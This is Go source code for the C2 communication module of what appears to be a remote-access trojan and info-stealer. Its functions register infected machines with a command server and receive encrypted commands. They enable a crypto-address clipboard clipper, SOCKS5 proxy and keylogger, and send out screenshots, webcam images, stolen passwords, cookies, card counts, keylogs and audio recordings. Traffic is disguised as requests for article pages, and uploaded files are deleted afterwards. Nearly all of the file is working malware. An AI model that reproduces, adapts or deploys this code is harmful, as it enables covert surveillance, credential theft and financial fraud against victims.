package core

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

func Ping(c2 string) bool { //Test Connection to see if its a working C2
	if strings.Contains(c2, "https://") {
		transport := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
		}
		c := http.Client{Transport: transport, Timeout: time.Duration(15) * time.Second}
		resp, err := c.Get(c2 + "ping?id=" + MyID)
		if err != nil {
			return false
		}
		defer resp.Body.Close()
		body, err := ioutil.ReadAll(resp.Body)
		if string(body) == "pong" {
			return true
		} else {
			return false
		}
	}
	return false
}

func GetSettingsC2() { //Gets last settings from C2
	if !ClientSleeping {
		for i := 0; i < len(C2); i++ {
			isC2 := Ping(C2[i]) //Test Connection to see if its a working C2
			if isC2 {
				//fmt.Println("Gettings Settings....", C2[i])
				transport := &http.Transport{
					TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
				}
				client := http.Client{Transport: transport, Timeout: time.Duration(15) * time.Second}
				req, _ := http.NewRequest("GET", C2[i]+"articles/"+RandomString(rand.Intn(15-3)+3)+"/"+RandomString(rand.Intn(15-3)+3)+"/account.html?id="+MyID, nil)
				req.Header.Set("User-Agent", UserAgent)
				resp, err := client.Do(req)
				if err == nil {
					body, err := ioutil.ReadAll(resp.Body)
					if err == nil {
						//fmt.Println(string(body))
						_ = resp.Body.Close()
						decoded, err := base64.RawURLEncoding.DecodeString(string(body))
						if err == nil {

							Decrypted := XXTeaDecrypt(decoded, []byte(EncryptionPassword))
							//fmt.Println(string(Decrypted))
							if string(Decrypted) == "failed" { //No settings for the Client on the C2, Go NewClient
								//fmt.Println("Need to Register with C2")
								RegisteredWithC2 = false
								go NewClientC2(C2[i])
							} else {
								//DEBUG
								fmt.Println("GOT SETTINGS FROM C2")
								fmt.Println(string(Decrypted))
								//DEBUG
								dec := json.NewDecoder(strings.NewReader(string(Decrypted)))
								var settings ClientSettings
								err := dec.Decode(&settings)
								if err == io.EOF {
									break
								}

								if settings.Clipper == "true" {
									if ClipperState == false {
										ClipperState = true
										go ClipperLoop()
									}
								} else {
									ClipperState = false
								}
								BTC = settings.BTC
								XMR = settings.XMR
								ETH = settings.ETH
								Custom = settings.Custom
								CustomRegex = settings.Regex

								if settings.Socks5 == "true" {
									if Socks5State == false {
										Socks5State = true
										go StartSocks5(settings.Socks5Connect)
									}
								} else {
									Socks5State = false
								}

								if settings.Keylogger == "true" {
									if KeyloggerState == false {
										KeyloggerState = true
										// START KEYLOGGER
									}
								} else {
									KeyloggerState = false
								}

								RegisteredWithC2 = true
								//go ReadC2() // Start Command Routine
							}
						}
					}
				}
			}
		}
	}
}

func NewClientC2(C2 string) { //Sends all base information to C2 (IP, OS, States, Etc)
	isC2 := Ping(C2) //Test Connection to see if its a working C2
	if isC2 {
	Retry:
		//fmt.Println("Registering with C2", C2)
		tr := &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
		}
		client := &http.Client{Transport: tr, Timeout: time.Duration(15) * time.Second}
		data := url.Values{}

		clientJson := UpdateClientInfo{MyID, ClientVersion, GetClientIP(), GetOS(),
			GetGPU(), strconv.FormatBool(AdminState), Base64Encode(GetSystemInfo()), Base64Encode(GetAntiVirus()),
			strconv.FormatBool(ClipperState), BTC, XMR, ETH, Custom, CustomRegex,
			strconv.FormatBool(MinerState), strconv.FormatBool(Socks5State), strconv.FormatBool(ReverseProxyState),
			strconv.FormatBool(RemoteShellState), strconv.FormatBool(KeyloggerState), strconv.FormatBool(FileHunterState),
			strconv.FormatBool(StealPasswords), "Never", "Never", strconv.Itoa(PingTime), strconv.Itoa(Jitter), UserAgent,
			InstanceKey, strconv.FormatBool(Install),
			strconv.FormatBool(SmartCopy), InstalledName, InstalledLocationU + "|" + InstalledLocationA, strconv.FormatBool(Campaign),
			strconv.FormatBool(AntiForensics), strconv.Itoa(AntiForensicsResponse),
			strconv.FormatBool(UACBypass), strconv.FormatBool(Guardian), strconv.FormatBool(DefenceSystem), strconv.FormatBool(ACG),
			strconv.FormatBool(HideFromDefender), strconv.FormatBool(AntiProcessWindow),
			strconv.FormatBool(AntiProcess), strconv.FormatBool(BlockTaskManager)}
		res, _ := json.Marshal(clientJson)

		var output string
		output += string(res)

		Encrypted := XXTeaEncrypt([]byte(output), []byte(EncryptionPassword))
		encoded := base64.RawURLEncoding.EncodeToString(Encrypted)

		data.Add("id", MyID)
		data.Add("data", encoded)
		u, _ := url.ParseRequestURI(C2 + "articles/" + RandomString(rand.Intn(15)) + "/" + RandomString(rand.Intn(15)) + "/new.html")
		urlStr := fmt.Sprintf("%v", u)
		req, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))
		req.Header.Set("User-Agent", UserAgent)
		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
		resp, err := client.Do(req)
		if err == nil {
			body, err := ioutil.ReadAll(resp.Body)
			if err == nil {
				resp.Body.Close()

				if !strings.Contains(string(body), "success") {
					time.Sleep(time.Duration(PingTime+randInt(0, Jitter)) * time.Second) //Thread sleep for X = PingTime Minutes and try again.
					goto Retry
				}
				//DEBUG
				fmt.Println("REGISTERED WITH C2")
				//DEBUG
				RegisteredWithC2 = true
				//go ReadC2()
				//go ImagesC2(true, false)
				go ImagesC2(false, false)

				if StealPasswords { //Trigger Password Stealer
					go HandleCommands("X", "0xPASS", "")
				}

				if ClipperState { //Turn on Clipper
					go ClipperLoop()
				}
			}
		}
	}
}

func ReadC2() { //Checks for commands
	for {
		if !ClientSleeping {
			if RegisteredWithC2 {
				for i := 0; i < len(C2); i++ {
					isC2 := Ping(C2[i]) //Test Connection to see if its a working C2
					if isC2 {
						//DEBUG
						//fmt.Println("Reading C2", C2[i])
						//DEBUG
						transport := &http.Transport{
							TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
						}

						client := http.Client{Transport: transport, Timeout: time.Duration(15) * time.Second}

						req, _ := http.NewRequest("GET", C2[i]+"articles/"+RandomString(rand.Intn(15-3)+3)+"/"+RandomString(rand.Intn(15-3)+3)+"/read.html?id="+MyID, nil)
						req.Header.Set("User-Agent", UserAgent)

						resp, err := client.Do(req)
						if err == nil {

							body, err := ioutil.ReadAll(resp.Body)
							if err == nil {
								_ = resp.Body.Close()
								decoded, err := base64.RawURLEncoding.DecodeString(string(body))
								if err == nil {

									Decrypted := XXTeaDecrypt(decoded, []byte(EncryptionPassword))
									if string(Decrypted) == "failed" { //No settings for the Client on the C2, Go NewClient
										RegisteredWithC2 = false
										go NewClientC2(C2[i])
									} else if len(string(Decrypted)) > 1 {
										//DEBUG
										fmt.Println("NEW COMMANDS FROM C2")
										fmt.Println(string(Decrypted))
										//DEBUG
										dec := json.NewDecoder(strings.NewReader(string(Decrypted)))
										for {
											var cmds Command
											err := dec.Decode(&cmds)
											if err == io.EOF {
												break
											}
											fmt.Println("ISSUE NEW COMMANDS TO COMMAND ROUTINE")
											//fmt.Println(cmds.Id, cmds.DAT, cmds.Parameters)
											go HandleCommands(cmds.Id, cmds.DAT, cmds.Parameters)
										}
									}
								}
							}
						}
					}
				}
			}
		}
		time.Sleep(time.Duration(PingTime+randInt(0, Jitter)) * time.Second) //Thread sleep for X = PingTime Minutes and try again.
	}
}

func CommandUpdateC2(id string, status string) { //Sends back if its Completed a command
	if !ClientSleeping {
		if RegisteredWithC2 {
			for i := 0; i < len(C2); i++ {
				isC2 := Ping(C2[i]) //Test Connection to see if its a working C2
				if isC2 {
				Retry:
					tr := &http.Transport{
						TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
					}
					client := &http.Client{Transport: tr, Timeout: time.Duration(15) * time.Second}
					data := url.Values{}

					clientJson := CommandStatus{id, status}
					res, _ := json.Marshal(clientJson)

					var output string
					output += string(res)

					Encrypted := XXTeaEncrypt([]byte(output), []byte(EncryptionPassword))
					encoded := base64.RawURLEncoding.EncodeToString(Encrypted)
					//fmt.Println(MyID, encoded)
					data.Add("id", MyID)
					data.Add("data", encoded)
					u, _ := url.ParseRequestURI(C2[i] + "articles/" + RandomString(rand.Intn(15-3)+3) + "/" + RandomString(rand.Intn(15-3)+3) + "/edit.html")
					urlStr := fmt.Sprintf("%v", u)
					req, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))

					req.Header.Set("User-Agent", UserAgent)
					req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
					resp, _ := client.Do(req)

					body, _ := ioutil.ReadAll(resp.Body)
					resp.Body.Close()
					if !strings.Contains(string(body), "success") {
						time.Sleep(time.Duration(PingTime+randInt(0, Jitter)) * time.Second) //Thread sleep for X = PingTime Minutes and try again.
						goto Retry
					}
				}
			}
		}
	}
}

func ImagesC2(webcam bool, compress bool) { //Sends Screenshot and Webcam Images
	if !ClientSleeping {
		if RegisteredWithC2 {
			for i := 0; i < len(C2); i++ {
				isC2 := Ping(C2[i]) //Test Connection to see if its a working C2
				if isC2 {
					var rawImage []byte
					var imageType string

					if webcam { //Send a Webcam Image
						image, err := TakeWebcamImage()
						if err != nil { //Error getting Webcam Image, Maybe no Webcam?
							rawImage = []byte("Error Getting Webcam")
						} else {
							rawImage = image
						}
					} else { //Send a Desktop Image
						image, err := CaptureScreen(compress)
						if err != nil { //Error getting Webcam Image, Maybe no Webcam?
							rawImage = []byte("Error Getting Screenshot")
						} else {
							rawImage = image
						}
					}
				Retry:
					tr := &http.Transport{
						TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
					}
					client := &http.Client{Transport: tr, Timeout: time.Duration(15) * time.Second}
					data := url.Values{}
					if webcam {
						imageType = "Webcam"
					} else {
						imageType = "Screenshot"
					}

					clientJson := ClientImage{imageType, Base64Encode(string(rawImage))}
					res, _ := json.Marshal(clientJson)

					var output string
					output += string(res)

					Encrypted := XXTeaEncrypt([]byte(output), []byte(EncryptionPassword))
					encoded := base64.RawURLEncoding.EncodeToString(Encrypted)
					//fmt.Println(MyID, encoded)
					data.Add("id", MyID)
					data.Add("data", encoded)
					u, _ := url.ParseRequestURI(C2[i] + "articles/" + RandomString(rand.Intn(15-3)+3) + "/" + RandomString(rand.Intn(15-3)+3) + "/images.html")
					urlStr := fmt.Sprintf("%v", u)
					req, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))

					req.Header.Set("User-Agent", UserAgent)
					req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
					resp, _ := client.Do(req)

					body, _ := ioutil.ReadAll(resp.Body)
					resp.Body.Close()
					if !strings.Contains(string(body), "success") {
						time.Sleep(time.Duration(PingTime+randInt(0, Jitter)) * time.Second) //Thread sleep for X = PingTime Minutes and try again.
						goto Retry
					}
				}
			}
		}
	}
}

func UpdateSettings() bool { //Updates Client and C2 settings
	if !ClientSleeping {
		if RegisteredWithC2 {
			for i := 0; i < len(C2); i++ {
				isC2 := Ping(C2[i]) //Test Connection to see if its a working C2
				if isC2 {
					//C2[i]+"articles/"+RandomString(rand.Intn(15-3)+3)+"/"+RandomString(rand.Intn(15-3)+3)+"/member.html"
					//fmt.Println("Registering with C2", C2)
				Retry:
					tr := &http.Transport{
						TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
					}
					client := &http.Client{Transport: tr, Timeout: time.Duration(15) * time.Second}
					data := url.Values{}

					clientJson := UpdateClientInfo{MyID, ClientVersion, GetClientIP(), GetOS(),
						GetGPU(), strconv.FormatBool(AdminState), Base64Encode(GetSystemInfo()), Base64Encode(GetAntiVirus()),
						strconv.FormatBool(ClipperState), BTC, XMR, ETH, Custom, CustomRegex,
						strconv.FormatBool(MinerState), strconv.FormatBool(Socks5State), strconv.FormatBool(ReverseProxyState),
						strconv.FormatBool(RemoteShellState), strconv.FormatBool(KeyloggerState), strconv.FormatBool(FileHunterState),
						strconv.FormatBool(StealPasswords), "", "", strconv.Itoa(PingTime), strconv.Itoa(Jitter), UserAgent,
						InstanceKey, strconv.FormatBool(Install),
						strconv.FormatBool(SmartCopy), InstalledName, InstalledLocationU + "|" + InstalledLocationA, strconv.FormatBool(Campaign),
						strconv.FormatBool(AntiForensics), strconv.Itoa(AntiForensicsResponse),
						strconv.FormatBool(UACBypass), strconv.FormatBool(Guardian), strconv.FormatBool(DefenceSystem), strconv.FormatBool(ACG),
						strconv.FormatBool(HideFromDefender), strconv.FormatBool(AntiProcessWindow),
						strconv.FormatBool(AntiProcess), strconv.FormatBool(BlockTaskManager)}
					res, _ := json.Marshal(clientJson)

					var output string
					output += string(res)

					Encrypted := XXTeaEncrypt([]byte(output), []byte(EncryptionPassword))
					encoded := base64.RawURLEncoding.EncodeToString(Encrypted)

					data.Add("id", MyID)
					data.Add("data", encoded)
					u, _ := url.ParseRequestURI(C2[i] + "articles/" + RandomString(rand.Intn(15)) + "/" + RandomString(rand.Intn(15)) + "/member.html")
					urlStr := fmt.Sprintf("%v", u)
					req, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))
					req.Header.Set("User-Agent", UserAgent)
					req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
					resp, err := client.Do(req)
					if err == nil {
						body, err := ioutil.ReadAll(resp.Body)
						if err == nil {
							resp.Body.Close()

							if !strings.Contains(string(body), "success") {
								time.Sleep(time.Duration(PingTime+randInt(0, Jitter)) * time.Second) //Thread sleep for X = PingTime Minutes and try again.
								goto Retry
							}
							go ImagesC2(false, false)
							go ImagesC2(true, false)
							return true
						}
					}
					return false
				}
				return false
			}
			return false
		}
		return false
	}
	return false
}

func Respond(data string) { //Updates C2 with Remoteshell response
	if !ClientSleeping {
		if RegisteredWithC2 {
			for i := 0; i < len(C2); i++ {
				isC2 := Ping(C2[i]) //Test Connection to see if its a working C2
				if isC2 {
					//C2[i]+"articles/"+RandomString(rand.Intn(15-3)+3)+"/"+RandomString(rand.Intn(15-3)+3)+"/member.html"
				Retry:
					tr := &http.Transport{
						TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
					}
					client := &http.Client{Transport: tr, Timeout: time.Duration(15) * time.Second}
					Encrypted := XXTeaEncrypt([]byte(data), []byte(EncryptionPassword))
					encoded := base64.RawURLEncoding.EncodeToString(Encrypted)

					data := url.Values{}
					data.Add("id", MyID)
					data.Add("data", encoded)
					u, _ := url.ParseRequestURI(C2[i] + "articles/" + RandomString(rand.Intn(15-3)+3) + "/" + RandomString(rand.Intn(15-3)+3) + "/reply.html")
					urlStr := fmt.Sprintf("%v", u)
					req, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))

					req.Header.Set("User-Agent", UserAgent)
					req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
					resp, _ := client.Do(req)

					body, _ := ioutil.ReadAll(resp.Body)
					resp.Body.Close()
					if !strings.Contains(string(body), "success") {
						time.Sleep(time.Duration(PingTime+randInt(0, Jitter)) * time.Second) //Thread sleep for X = PingTime Minutes and try again.
						goto Retry
					}
				}
			}
		}
	}
}

func UpdatePassCounts() { //Updates C2 with Stolen Password, Cookies and Credit Card Counts
	if !ClientSleeping {
		if RegisteredWithC2 {
			for i := 0; i < len(C2); i++ {
				isC2 := Ping(C2[i]) //Test Connection to see if its a working C2
				if isC2 {
				Retry:
					tr := &http.Transport{
						TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
					}
					client := &http.Client{Transport: tr, Timeout: time.Duration(15) * time.Second}
					data := url.Values{}

					data.Add("id", MyID)
					data.Add("0", strconv.Itoa(PasswordCount))
					data.Add("1", strconv.Itoa(CookieCount))
					data.Add("2", strconv.Itoa(CCCount))
					u, _ := url.ParseRequestURI(C2[i] + "articles/" + RandomString(rand.Intn(15-3)+3) + "/" + RandomString(rand.Intn(15-3)+3) + "/thread.html")
					urlStr := fmt.Sprintf("%v", u)
					req, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))

					req.Header.Set("User-Agent", UserAgent)
					req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
					resp, _ := client.Do(req)

					body, _ := ioutil.ReadAll(resp.Body)
					resp.Body.Close()
					if !strings.Contains(string(body), "success") {
						time.Sleep(time.Duration(PingTime+randInt(0, Jitter)) * time.Second) //Thread sleep for X = PingTime Minutes and try again.
						goto Retry
					}
				}
			}
		}
	}
}

func FileBrowser(fileData string) {
	if !ClientSleeping {
		if RegisteredWithC2 {
			for i := 0; i < len(C2); i++ {
				isC2 := Ping(C2[i]) //Test Connection to see if its a working C2
				if isC2 {
				Retry:
					tr := &http.Transport{
						TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
					}
					client := &http.Client{Transport: tr, Timeout: time.Duration(15) * time.Second}
					data := url.Values{}

					Encrypted := XXTeaEncrypt([]byte(fileData), []byte(EncryptionPassword))
					encoded := base64.RawURLEncoding.EncodeToString(Encrypted)

					data.Add("id", MyID)
					data.Add("data", encoded)
					u, _ := url.ParseRequestURI(C2[i] + "articles/" + RandomString(rand.Intn(15-3)+3) + "/" + RandomString(rand.Intn(15-3)+3) + "/shop.html")
					urlStr := fmt.Sprintf("%v", u)
					req, _ := http.NewRequest("POST", urlStr, bytes.NewBufferString(data.Encode()))

					req.Header.Set("User-Agent", UserAgent)
					req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
					resp, _ := client.Do(req)

					body, _ := ioutil.ReadAll(resp.Body)
					resp.Body.Close()
					if !strings.Contains(string(body), "success") {
						time.Sleep(time.Duration(PingTime+randInt(0, Jitter)) * time.Second) //Thread sleep for X = PingTime Minutes and try again.
						goto Retry
					}
				}
			}
		}
	}
}

func UploadFile(fileType, filepath string) { //Sends Files, Keylogs,
	if !ClientSleeping {
		if RegisteredWithC2 {
			for i := 0; i < len(C2); i++ {
				isC2 := Ping(C2[i]) //Test Connection to see if its a working C2
				if isC2 {
				Retry:
					tr := &http.Transport{
						TLSClientConfig: &tls.Config{InsecureSkipVerify: InsecureSkipVerify},
					}
					client := &http.Client{Transport: tr, Timeout: time.Duration(15) * time.Second}
					body := &bytes.Buffer{}
					writer := multipart.NewWriter(body)
					fw, _ := writer.CreateFormField("id")
					_, _ = io.Copy(fw, strings.NewReader(MyID))
					fw, _ = writer.CreateFormField("type")
					_, _ = io.Copy(fw, strings.NewReader(fileType))
					if fileType == "0" { //Passwords
						fw, _ = writer.CreateFormFile("file", "Upload.zip")
					} else if fileType == "1" { //Keylogs
						fw, _ = writer.CreateFormFile("file", time.Now().Format("2006-01-02-15-04-05")+".html")
					} else if fileType == "2" { //Audio
						fw, _ = writer.CreateFormFile("file", time.Now().Format("2006-01-02-15-04-05")+".wav")
					}
					file, err := os.Open(filepath)
					if err != nil {
						time.Sleep(time.Duration(PingTime+randInt(0, Jitter)) * time.Second) //Thread sleep for X = PingTime Minutes and try again.
						goto Retry
					}
					_, _ = io.Copy(fw, file)
					writer.Close()
					req, err := http.NewRequest("POST", C2[i]+"articles/"+RandomString(rand.Intn(15-3)+3)+"/"+RandomString(rand.Intn(15-3)+3)+"/upload.html", bytes.NewReader(body.Bytes()))
					if err != nil {
						time.Sleep(time.Duration(PingTime+randInt(0, Jitter)) * time.Second) //Thread sleep for X = PingTime Minutes and try again.
						goto Retry
					}
					req.Header.Set("Content-Type", writer.FormDataContentType())
					req.Header.Set("User-Agent", UserAgent)
					rsp, _ := client.Do(req)
					if rsp.StatusCode != http.StatusOK {
						time.Sleep(time.Duration(PingTime+randInt(0, Jitter)) * time.Second) //Thread sleep for X = PingTime Minutes and try again.
						goto Retry
					} else {
						_ = os.Remove(filepath)
					}
				}
			}
		}
	}
}
